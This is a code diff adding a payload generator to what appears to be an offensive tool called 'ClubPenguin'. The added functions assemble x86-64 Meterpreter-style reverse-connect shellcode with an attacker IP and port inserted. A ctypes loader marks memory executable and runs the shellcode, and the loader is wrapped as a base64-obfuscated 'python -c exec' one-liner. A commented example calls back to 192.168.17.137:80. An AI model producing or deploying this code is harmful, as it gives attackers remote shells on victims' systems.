@@ -153,6 +153,56 @@ def parse_targets(target):
     else:
         return [t.strip()]
 
+def shellcode_meterpreter_64(port,ip):
+    hex_port = make_port(port)
+    hex_ip = make_ip(ip)
+    shellcode = '\\x48\\x31\\xff\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d\\x31\\xc9\\x6a\\x22\\x41\\x5a\\xb2\\x07\\x0f\\x05\\x48\\x85\\xc0\\x78\\x5b\\x6a\\x0a\\x41\\x59\\x56\\x50\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x85\\xc0\\x78\\x44\\x48\\x97\\x48\\xb9\\x02\\x00{0}{1}\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x85\\xc0\\x79\\x1b\\x49\\xff\\xc9\\x74\\x22\\x6a\\x23\\x58\\x6a\\x00\\x6a\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x0f\\x05\\x48\\x85\\xc0\\x79\\xb7\\xeb\\x0c\\x59\\x5e\\x5a\\x0f\\x05\\x48\\x85\\xc0\\x78\\x02\\xff\\xe6\\x6a\\x3c\\x58\\x6a\\x01\\x5f\\x0f\\x05'.format(hex_port, hex_ip)
+    return shellcode
+
+def create_payload(shellcode):
+    the_code = '''
+#!/usr/bin/env python
+from ctypes import *
+libc = cdll.LoadLibrary("libc.so.6")
+psc = "{0}"
+libc.malloc.restype = c_void_p
+libc.malloc(0x400)
+sc = libc.malloc(0x400)
+print '[+]\tMemory of shellcode ' + hex(sc)
+page = ((sc >> 12) << 12)
+print '[+]\tPage of shellcode: ' + hex(page)
+page = cast(page, POINTER(c_void_p))
+libc.mprotect.argtype = [c_void_p, c_void_p, c_long]
+print '[i]\tMprotect success is 0: %d' % libc.mprotect(page, 1, 7)
+index = 0
+for c in psc:
+    c_int.from_address
+    ptr = c_char.from_address(sc + index)
+    print '[i]\twriting 0x%x to 0x%x' % (ord(c), sc+index)
+    ptr.value = c
+    index += 1
+fn = cast(sc, CFUNCTYPE(c_void_p))
+print '[+]\tCalling shellcode!'
+fn()
+    '''.format(shellcode)
+    return "python -c \"exec(\'" + base64.b64encode(the_code) + "\\n\'.decode(\'base64\'))\""
+
+def make_ip(ip_address):
+    ip_address =ip_address.split(".")
+    hex_ip = ""
+    for octet in ip_address:
+        hex_ip += ('\\x' + str(hex(int(octet)))[2:4].zfill(2))
+    return hex_ip
+
+def make_port(port):
+    hex_port = ""
+    port = str(hex(int(port)))[2::].zfill(4)
+    hex_port += '\\x' + port[0:2].zfill(2)
+    hex_port += '\\x' + port[2:4].zfill(2)
+    return hex_port
+
+#print create_payload(shellcode_meterpreter_64(80, '192.168.17.137'))
+
 def main():
     parser = argparse.ArgumentParser(description='ClubPenguin')
     parser.add_argument("first_arg", nargs=1)
